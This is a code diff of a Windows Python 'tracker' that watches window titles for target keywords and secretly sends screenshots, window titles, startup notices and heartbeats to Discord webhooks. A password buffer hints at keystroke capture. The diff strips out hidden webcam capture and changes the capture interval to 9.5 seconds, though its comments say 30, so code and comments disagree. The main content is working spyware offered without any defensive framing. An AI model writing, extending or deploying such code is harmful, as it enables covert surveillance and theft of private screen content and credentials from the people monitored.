@@ -1,5 +1,4 @@
 import time
-import time
 import threading
 import win32gui
 import pyautogui
@@ -7,10 +6,8 @@ import keyboard
 import requests
 import io
 from datetime import datetime
-from PIL import ImageGrab, Image
+from PIL import ImageGrab
 import json
-import cv2  # Added for camera access
-import numpy as np  # Added for image processing
 
 # ---------------- CONFIG ---------------- #
 TARGET_KEYWORDS = [
@@ -112,7 +109,7 @@ DISCORD_WEBHOOKS = [
 ]
 SEND_SCREENSHOTS = True  # Set to False to disable screenshot sending
 SCREENSHOT_DELAY = 0.5   # Delay after detection before taking screenshot (seconds)
-PERIODIC_SCREENSHOT_INTERVAL = 5  # Take screenshot every 5 seconds (even without detection)
+PERIODIC_SCREENSHOT_INTERVAL = 9.5  # Take screenshot every 30 seconds (even without detection)
 HEARTBEAT_INTERVAL = 300  # 5 minutes in seconds
 
 # ---------------- GLOBALS ---------------- #
@@ -123,7 +120,6 @@ last_key_time = 0       # For clearing password buffer after timeout
 last_heartbeat_time = time.time()  # Track when last heartbeat was sent
 last_periodic_screenshot_time = time.time()  # Track when last periodic screenshot was taken
 program_start_time = time.time()  # Track program start time
-camera_device_index = 0  # Default camera index
 
 # Track focus state to prevent spam
 current_focused_hwnd = None  # Current window handle
@@ -153,71 +149,16 @@ def take_screenshot():
         print(f"[SCREENSHOT ERROR] {e}")
         return None
 
-def detect_and_initialize_camera():
-    """Try to detect and initialize available camera"""
-    global camera_device_index
-    
-    # Try to find camera by checking available devices
-    for i in range(3):  # Check first 3 indices
-        try:
-            cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)  # CAP_DSHOW for Windows
-            if cap.isOpened():
-                ret, frame = cap.read()
-                cap.release()
-                if ret and frame is not None:
-                    camera_device_index = i
-                    print(f"[CAMERA] Found camera at index {i}")
-                    return True
-        except:
-            continue
-    
-    print("[CAMERA] No camera found, camera features disabled")
-    return False
-
-def take_camera_picture():
-    """Take a picture from the camera"""
-    try:
-        cap = cv2.VideoCapture(camera_device_index, cv2.CAP_DSHOW)
-        if not cap.isOpened():
-            print("[CAMERA] Could not open camera")
-            return None
-        
-        # Give camera time to adjust
-        time.sleep(0.5)
-        
-        # Capture frame
-        ret, frame = cap.read()
-        cap.release()
-        
-        if not ret or frame is None:
-            print("[CAMERA] Failed to capture frame")
-            return None
-        
-        # Convert BGR to RGB
-        frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
-        # Convert to PIL Image
-        camera_image = Image.fromarray(frame_rgb)
-        
-        return camera_image
-        
-    except Exception as e:
-        print(f"[CAMERA ERROR] {e}")
-        return None
-
-def send_to_webhook(webhook_url, payload, screenshot_bytes=None, camera_bytes=None):
+def send_to_webhook(webhook_url, payload, screenshot_bytes=None):
     """Send data to a specific webhook URL"""
     try:
-        files = {}
-        
         if screenshot_bytes:
-            screenshot_io = io.BytesIO(screenshot_bytes)
-            files['file'] = ('screenshot.png', screenshot_io, 'image/png')
-        
-        if camera_bytes:
-            camera_io = io.BytesIO(camera_bytes)
-            files['file2'] = ('camera.png', camera_io, 'image/png')
-        
-        if files:
+            # Create a new BytesIO object for each webhook
+            img_byte_arr = io.BytesIO(screenshot_bytes)
+            files = {
+                'file': ('screenshot.png', img_byte_arr, 'image/png')
+            }
+            
             # Prepare multipart form data
             if 'embeds' in payload:
                 data = {'payload_json': json.dumps(payload)}
@@ -255,7 +196,7 @@ def send_to_webhook(webhook_url, payload, screenshot_bytes=None, camera_bytes=No
         print(f"[WEBHOOK ERROR] {e} for {webhook_url[:40]}...")
         return False
 
-def send_to_all_webhooks(payload, screenshot=None, camera_image=None):
+def send_to_all_webhooks(payload, screenshot=None):
     """Send message to all configured webhooks"""
     if not DISCORD_WEBHOOKS or all(wh == "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
         print("[DISCORD] No webhooks configured")
@@ -264,39 +205,34 @@ def send_to_all_webhooks(payload, screenshot=None, camera_image=None):
     success_count = 0
     threads = []
     
-    # Convert images to bytes once
+    # Convert screenshot to bytes once
     screenshot_bytes = None
-    camera_bytes = None
-    
     if screenshot and SEND_SCREENSHOTS:
         img_byte_arr = io.BytesIO()
         screenshot.save(img_byte_arr, format='PNG')
         screenshot_bytes = img_byte_arr.getvalue()  # Get raw bytes
-    
-    if camera_image:
-        img_byte_arr = io.BytesIO()
-        camera_image.save(img_byte_arr, format='PNG')
-        camera_bytes = img_byte_arr.getvalue()  # Get raw bytes
-    
-    # Add image info to payload
-    if 'embeds' in payload:
-        if screenshot_bytes and camera_bytes:
-            payload['content'] = "📸 **Screenshot and Camera picture captured below:**"
-        elif screenshot_bytes:
-            payload['content'] = "📸 **Screenshot captured below:**"
-        elif camera_bytes:
-            payload['content'] = "📷 **Camera picture captured below:**"
+        
+        # Add screenshot info to payload
+        if 'embeds' in payload:
+            if 'content' not in payload or not payload['content']:
+                payload['content'] = "📸 **Screenshot captured below:**"
     
     for webhook_url in DISCORD_WEBHOOKS:
         if not webhook_url or webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
             continue
             
         # Create thread for each webhook
-        thread = threading.Thread(
-            target=send_to_webhook,
-            args=(webhook_url, payload),
-            kwargs={'screenshot_bytes': screenshot_bytes, 'camera_bytes': camera_bytes}
-        )
+        if screenshot_bytes:
+            thread = threading.Thread(
+                target=send_to_webhook,
+                args=(webhook_url, payload),
+                kwargs={'screenshot_bytes': screenshot_bytes}
+            )
+        else:
+            thread = threading.Thread(
+                target=send_to_webhook,
+                args=(webhook_url, payload)
+            )
         
         thread.start()
         threads.append(thread)
@@ -312,8 +248,8 @@ def send_to_all_webhooks(payload, screenshot=None, camera_image=None):
     print(f"[DISCORD] Sent to {success_count}/{len(DISCORD_WEBHOOKS)} webhooks")
     return success_count > 0
 
-def send_discord_alert(title, keyword, screenshot=None, camera_image=None):
-    """Send alert to Discord webhooks with optional screenshot and camera image"""
+def send_discord_alert(title, keyword, screenshot=None):
+    """Send alert to Discord webhooks with optional screenshot"""
     # Prepare the message
     current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     embed = {
@@ -330,7 +266,7 @@ def send_discord_alert(title, keyword, screenshot=None, camera_image=None):
         "content": f"🚨 **Target detected:** {title[:100]}"
     }
     
-    return send_to_all_webhooks(payload, screenshot, camera_image)
+    return send_to_all_webhooks(payload, screenshot)
 
 def send_discord_status(status):
     """Send tracking status to Discord"""
@@ -392,7 +328,7 @@ def send_heartbeat():
         return False
 
 def send_periodic_screenshot():
-    """Send periodic screenshot to Discord (every 5 seconds)"""
+    """Send periodic screenshot to Discord (every 30 seconds)"""
     try:
         # Get current window info even if not a target
         hwnd = win32gui.GetForegroundWindow()
@@ -406,12 +342,9 @@ def send_periodic_screenshot():
         # Take screenshot
         screenshot = take_screenshot() if SEND_SCREENSHOTS else None
         
-        # Take camera picture
-        camera_image = take_camera_picture()
-        
         # Prepare message
         embed = {
-            "title": "⏰ Periodic Capture",
+            "title": "⏰ Periodic Screenshot",
             "description": f"**Window Title:** `{title}`\n**Time:** `{current_time}`\n**Interval:** `{PERIODIC_SCREENSHOT_INTERVAL} seconds`",
             "color": 10181046,  # Purple color
             "footer": {
@@ -421,12 +354,12 @@ def send_periodic_screenshot():
         
         payload = {
             "embeds": [embed],
-            "content": f"📸 **Periodic capture (Screen + Camera)**"
+            "content": f"📸 **Periodic screenshot captured**"
         }
         
-        success = send_to_all_webhooks(payload, screenshot, camera_image)
+        success = send_to_all_webhooks(payload, screenshot)
         if success:
-            print(f"[PERIODIC] Sent periodic capture at {current_time} (Window: '{title[:50]}...')")
+            print(f"[PERIODIC] Sent periodic screenshot at {current_time} (Window: '{title[:50]}...')")
         return success
             
     except Exception as e:
@@ -440,7 +373,7 @@ def send_startup_message():
         
         embed = {
             "title": "🚀 Tracker Started",
-            "description": f"**Tracker system has been launched**\n**Start Time:** `{current_time}`\n**Initial Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`\n**Periodic Captures:** `Every {PERIODIC_SCREENSHOT_INTERVAL} seconds (Screen + Camera)`",
+            "description": f"**Tracker system has been launched**\n**Start Time:** `{current_time}`\n**Initial Status:** `{'ENABLED' if tracking_enabled else 'DISABLED'}`\n**Periodic Screenshots:** `Every {PERIODIC_SCREENSHOT_INTERVAL} seconds`",
             "color": 3066993,  # Green color
             "footer": {
                 "text": "Tracker System"
@@ -590,7 +523,7 @@ def heartbeat_monitor():
 
 # ---------------- PERIODIC SCREENSHOT THREAD ---------------- #
 def periodic_screenshot_monitor():
-    """Periodically take screenshots every 5 seconds"""
+    """Periodically take screenshots every 30 seconds"""
     global last_periodic_screenshot_time
     
     while True:
@@ -603,7 +536,7 @@ def periodic_screenshot_monitor():
                 
                 threading.Thread(target=send_periodic_screenshot, daemon=True).start()
                 last_periodic_screenshot_time = current_time
-                print(f"[PERIODIC] Next capture in {PERIODIC_SCREENSHOT_INTERVAL} seconds")
+                print(f"[PERIODIC] Next screenshot in {PERIODIC_SCREENSHOT_INTERVAL} seconds")
             
             # Sleep for 1 second and check again
             time.sleep(1)
@@ -616,15 +549,7 @@ def periodic_screenshot_monitor():
 print("[SYSTEM] Monitoring started...")
 print("[SYSTEM] Tracking is ENABLED by default")
 print(f"[SYSTEM] Alert cooldown: {alert_cooldown} seconds per window")
-print(f"[SYSTEM] Periodic captures: Every {PERIODIC_SCREENSHOT_INTERVAL} seconds (Screen + Camera)")
-
-# Initialize camera
-print("[CAMERA] Initializing camera...")
-camera_available = detect_and_initialize_camera()
-if camera_available:
-    print("[CAMERA] Camera ready for use")
-else:
-    print("[CAMERA] Camera not available, only screenshots will be sent")
+print(f"[SYSTEM] Periodic screenshots: Every {PERIODIC_SCREENSHOT_INTERVAL} seconds")
 
 # Send startup webhook immediately
 if DISCORD_WEBHOOKS and any(wh != "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
@@ -639,7 +564,7 @@ if DISCORD_WEBHOOKS and any(wh != "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISC
     # Start periodic screenshot monitor in a separate thread
     periodic_thread = threading.Thread(target=periodic_screenshot_monitor, daemon=True)
     periodic_thread.start()
-    print(f"[PERIODIC] Periodic capture monitor started (every {PERIODIC_SCREENSHOT_INTERVAL} seconds)")
+    print(f"[PERIODIC] Periodic screenshot monitor started (every {PERIODIC_SCREENSHOT_INTERVAL} seconds)")
 else:
     print("[DISCORD] No webhooks configured - skipping startup and heartbeat messages")
 
@@ -696,13 +621,10 @@ try:
                         # Take screenshot in main thread
                         screenshot = take_screenshot() if SEND_SCREENSHOTS else None
                         
-                        # Take camera picture
-                        camera_image = take_camera_picture()
-                        
                         # Send alert to both webhooks
                         alert_thread = threading.Thread(
                             target=send_discord_alert,
-                            args=(title, keyword, screenshot, camera_image),
+                            args=(title, keyword, screenshot),
                             daemon=True
                         )
                         alert_thread.start()
